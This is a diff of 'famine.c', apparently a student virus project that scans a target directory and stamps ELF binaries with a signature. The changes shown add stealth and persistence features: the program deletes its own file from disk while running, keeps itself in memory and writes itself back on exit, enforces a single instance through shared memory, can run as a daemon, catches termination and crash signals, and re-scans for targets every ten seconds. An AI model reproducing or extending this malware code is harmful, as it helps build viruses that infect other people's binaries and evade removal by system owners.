@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   famine.c                                           :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: mbrement <mbrement@student.42lyon.fr>      +#+  +:+       +#+        */
+/*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/07/24 21:11:05 by mgama             #+#    #+#             */
-/*   Updated: 2024/07/25 16:53:42 by mbrement         ###   ########lyon.fr   */
+/*   Updated: 2024/07/26 19:38:53 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,19 +16,41 @@
 struct s_famine g_famine;
 int g_exit = 0;
 
-void	write_back_prog(void)
+void remove_shm(void)
 {
+    shmctl(shmget(SHM_KEY, sizeof(int), 0666), IPC_RMID, NULL);
+}
+
+int is_running(void)
+{
+	/**
+	 * Try to create a shared memory segment with the key SHM_KEY, if it fails
+	 * this means that the program is already running.
+	 */
+	int shmid = shmget(SHM_KEY, sizeof(int), IPC_CREAT | IPC_EXCL | 0666);
+	if (shmid == -1) {
+		return 1;
+	}
+	return 0;
+}
+
+int	write_back_prog(void)
+{
+	/**
+	 * When the program is done, write it back to the filesystem
+	 */
 	int fd = open(g_famine.name, O_CREAT | O_WRONLY, 0755);
 	if (fd < 0)
-		return;
+		return (0);
 	write(fd, (char *)g_famine.me, g_famine.len);
+	close(fd);
 	munmap(g_famine.me, g_famine.len);
+	return (0);
 }
 
 void interruptHandler(int sig)
 {
 	(void)sig;
-	// write_back_prog();
 	g_exit = 1;
 }
 
@@ -37,10 +59,11 @@ void famine(char *name, char *path)
 	struct stat statbuf;
 
 	const char elf_magic[] = {0x7f, 'E', 'L', 'F'};
-	const char signature[] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0              .\n           ,'/ \\`.\n          |\\/___\\/|\n          \\'\\   /`/\n           `.\\ /,'\n              |\n              |\n             |=|\n        /\\  ,|=|.  /\\\n    ,'`.  \\/ |=| \\/  ,'`.\n  ,'    `.|\\ `-' /|,'    `.\n,'   .-._ \\ `---' / _,-.   `.\n   ,'    `-`-._,-'-'    `.\n  '                       `\nFamine 1.5 by mbrement and mgama";
+	const char signature[] = FM_SIGNATURE;
 	const size_t elf_magic_size = sizeof(elf_magic);
 
 	char full_path[PATH_MAX + 1 + PATH_MAX];
+	bzero(full_path, PATH_MAX + 1 + PATH_MAX);
 	if (path != NULL)
 	{
 		strcpy(full_path, path);
@@ -121,12 +144,13 @@ int main(int argc, char **argv)
 	DIR *dir;
 	struct dirent *d;
 	struct stat stats;
-	int ch, option;
+	int ch, option = 0;
 	char *target = NULL;
 
 	struct getopt_list_s optlist[] = {
         {"daemon", 'd', OPTPARSE_NONE},
         {"once", 'o', OPTPARSE_NONE},
+        {"multiple-instances", 'm', OPTPARSE_NONE},
         {no_xsec, 0, OPTPARSE_REQUIRED},
         {0}
     };
@@ -145,6 +169,9 @@ int main(int argc, char **argv)
 			case 'o':
 				option |= F_ONCE;
 				break;
+			case 'm':
+				option |= F_MINSTANCE;
+				break;
 			default:
 				exit(0);
 		}
@@ -152,6 +179,11 @@ int main(int argc, char **argv)
 
 	if (argc - options.optind != 0)
 		return 0;
+
+	if (0 == (option & F_MINSTANCE) && is_running())
+	{
+		return 0;
+	}
 
 	int fd = open(argv[0], O_RDONLY);
 	if (fd < 0)
@@ -162,22 +194,43 @@ int main(int argc, char **argv)
 
 	g_famine.name = argv[0];
 	g_famine.len = stats.st_size;
+	/**
+	 * Copy the binary into a shared memory segment to save it and remove it from the filesystem
+	 * to remove it on runtime.
+	 */
 	g_famine.me = mmap(NULL, g_famine.len, PROT_READ, MAP_PRIVATE, fd, 0);
 	close(fd);
 	if (g_famine.me == NULL)
-		return (write_back_prog(), 0);
+		return (write_back_prog());
 
 	if (unlink(argv[0]) < 0)
-		return (write_back_prog(), 0);
+		return (write_back_prog());
 
+	/**
+	 * Daemonize the process if the option is set
+	 */
 	if (option & F_DAEMON)
 	{
+		/**
+		 * BD_NO_CHDIR: Don't change the current working directory to the root directory
+		 * BD_NO_REOPEN_STD_FDS: Don't reopen stdin, stdout, and stderr to /dev/null
+		 */
 		become_daemon(BD_NO_CHDIR | BD_NO_REOPEN_STD_FDS);
 	}
 
+	/**
+	 * Register the function to be called at normal process termination
+	 * Must be after daemonization to be effictive on the running process
+	 */
+	atexit(remove_shm);
+
+	/**
+	 * Catch kill signals to prevent segfaults.
+	 */
 	signal(SIGINT, interruptHandler);
 	signal(SIGQUIT, interruptHandler);
 	signal(SIGTERM, interruptHandler);
+	signal(SIGSEGV, interruptHandler);
 
 	do
 	{
@@ -185,23 +238,25 @@ int main(int argc, char **argv)
 		{
 			if (FM_SECURITY == 0)
 				break;
-
 			custom_target(target);
-			break;
+		}
+		else
+		{
+			dir = opendir(FM_TARGET);
+			if (!dir)
+				break;
+
+			while ((d = readdir(dir)) != NULL)
+				famine(d->d_name, FM_TARGET);
+		
+			closedir(dir);
 		}
 
-		dir = opendir(FM_TARGET);
-		if (!dir)
+		if (option & F_ONCE)
 			break;
 
-		while ((d = readdir(dir)) != NULL)
-			famine(d->d_name, FM_TARGET);
-	
-		closedir(dir);
+		sleep(10);
+	} while(!g_exit);
 
-		if (!(option & F_ONCE))
-			sleep(10);
-	} while(!g_exit && !(option & F_ONCE));
-
-	return (write_back_prog(), 0);
+	return (write_back_prog());
 }
